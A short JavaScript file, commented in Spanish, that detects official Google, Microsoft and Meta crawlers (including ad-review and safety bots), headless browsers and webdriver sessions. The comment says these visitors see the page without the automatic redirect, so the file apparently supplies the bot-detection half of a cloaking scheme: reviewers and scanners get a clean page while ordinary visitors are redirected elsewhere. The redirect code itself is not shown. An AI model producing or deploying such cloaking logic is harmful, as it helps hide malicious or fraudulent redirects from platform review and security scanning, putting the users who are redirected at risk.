/* Bots oficiales de Google, Microsoft y Meta.
   Fuente: developers.google.com/crawling, Bing Webmaster Tools, developers.facebook.com
   Si coinciden, se muestra la página (sin redirección automática). */

(function (g) {
  var TOKENS = [
    "googlebot-image",
    "googlebot-video",
    "googlebot-news",
    "googlebot",
    "storebot-google",
    "google-inspectiontool",
    "googleother-image",
    "googleother-video",
    "googleother",
    "google-cloudvertexbot",
    "google-extended",
    "google-cws",
    "google-gemininotebook",
    "google-notebooklm",
    "google-agent",
    "googlemessages",
    "google-pinpoint",
    "googleproducer",
    "google-read-aloud",
    "google-site-verification",
    "google-speakr",
    "googleweblight",
    "google favicon",
    "feedfetcher-google",
    "apis-google",
    "adsbot-google-mobile-apps",
    "adsbot-google-mobile",
    "adsbot-google",
    "mediapartners-google",
    "google-safety",
    "google-amphtml",
    "google-pagerenderer",
    "google-adwords",
    "google-ads",
    "googleassociation",
    "google-structured-data",
    "chrome-lighthouse",
    "pagespeed",
    "adidxbot",
    "bingbot",
    "bingpreview",
    "microsoftpreview",
    "msnbot-media",
    "msnbot",
    "skypeuripreview",
    "linkedinbot",
    "bingads",
    "microsoft-advertising",
    "facebookexternalhit",
    "facebookexternalua",
    "facebookcatalog",
    "facebookplatform",
    "facebookscraper",
    "facebookbot",
    "facebot",
    "meta-externalads",
    "meta-externalagent",
    "meta-externalfetcher",
    "meta-webindexer",
    "headlesschrome",
    "phantomjs",
    "puppeteer",
    "playwright"
  ];

  g.BOT_REVISION_RE = new RegExp(TOKENS.join("|"), "i");

  function porUrlCrawler(ua) {
    return /google\.com\/(bot|adsbot|mobile\/adsbot|feedfetcher)\.html/i.test(ua) ||
      /developers\.google\.com\/crawling/i.test(ua) ||
      /bing\.com\/bingbot\.htm/i.test(ua) ||
      /aka\.ms\/microsoftpreview/i.test(ua) ||
      /facebook\.com\/externalhit/i.test(ua) ||
      /developers\.facebook\.com\/docs\/sharing\/webmasters\/web-crawlers/i.test(ua);
  }

  g.esBotRevision = function (ua) {
    ua = String(ua || (g.navigator && g.navigator.userAgent) || "");
    if (!ua) return false;
    if (g.BOT_REVISION_RE.test(ua)) return true;
    if (porUrlCrawler(ua)) return true;
    if (g.navigator && g.navigator.webdriver) return true;
    return false;
  };
})(typeof window !== "undefined" ? window : globalThis);
